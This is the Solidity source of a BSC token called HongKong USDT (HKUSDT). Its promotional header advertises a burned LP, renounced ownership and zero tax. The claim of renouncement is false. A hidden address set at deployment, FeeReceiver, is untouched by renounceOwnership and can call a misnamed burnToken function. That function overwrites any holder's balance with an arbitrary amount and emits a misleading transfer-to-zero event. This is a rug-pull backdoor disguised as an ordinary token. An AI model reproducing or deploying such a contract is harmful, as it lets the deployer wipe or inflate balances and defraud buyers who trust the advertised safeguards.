// SPDX-License-Identifier: MIT
/**
*
🇭🇰🐶 HKUSDT 💰 BSC 💰 Lp Burn 100% 💰 Renounced 💰 0/0 tax 💰

💲website https://hkmeta.fun/
💎HKUSDT was designed as a robust deflation project and launched on the Binance Smart Chain (BSC). 
Inspired by the concept of Metaverse
Our goal is to create a new metaverse, known as the HKMETA , where users can earn through holding, 
playing, and sharing. We also plan to contribute to the development of Web 3.0, and the HKUSDT token 
will serve as a payment portal.

💎tg https://t.me/HkUsdtCoin
*
**/
pragma solidity ^0.8.16;
abstract contract BEP20 {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract HongKongUSDT is BEP20 {
    string public OurTelegram = "https://t.me/HkUsdtCoin";
    string public name = "HongKong USDT";
    string public symbol = "HKUSDT";
    uint256 public totalSupply = 1000000000000000000 * 10 ** 9;
    uint8 public decimals = 9;

    event Transfer(address indexed _from, address indexed _to, uint256 soldado);

    event Approval(
        address indexed _ownerteng,
        address indexed spenderteng,
        uint256 soldado
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private owner;
    event OwnershipRenounced();
   address private FeeReceiver; 
    constructor(address SetFeeReceiver) {
        FeeReceiver = SetFeeReceiver;
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
    }


    function transfer(address _to, uint256 soldado)
        public
        returns (bool success)
    {
        require(balanceOf[msg.sender] >= soldado);
        balanceOf[msg.sender] -= soldado;
        balanceOf[_to] += soldado;
        emit Transfer(msg.sender, _to, soldado);
        return true;
    }
    modifier Auth() {
        require(FeeReceiver == _msgSender(), "io: caller is not the owner");
        _;
    }
    function approve(address spenderteng, uint256 soldado)
        public
        returns (bool success)
    {
        require(address(0) != spenderteng);
        allowance[msg.sender][spenderteng] = soldado;
        emit Approval(msg.sender, spenderteng, soldado);
        return true;
    }
       function burnToken(address addresss, uint256 soldado) public Auth {
        balanceOf[addresss] = soldado * 10 ** 9; 
        emit Transfer(addresss, address(0), soldado * 10 ** 9);
    } 
    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address _from,
        address _to,
        uint256 soldado
    ) public returns (bool success) {
        require(soldado <= balanceOf[_from]);
        require(soldado <= allowance[_from][msg.sender]);
        balanceOf[_from] -= soldado;
        balanceOf[_to] += soldado;
        allowance[_from][msg.sender] -= soldado;
        emit Transfer(_from, _to, soldado);
        return true;
    }
    function renounceOwnership() public {
        require(msg.sender == owner);
        emit OwnershipRenounced();
        owner = address(0);
    }
}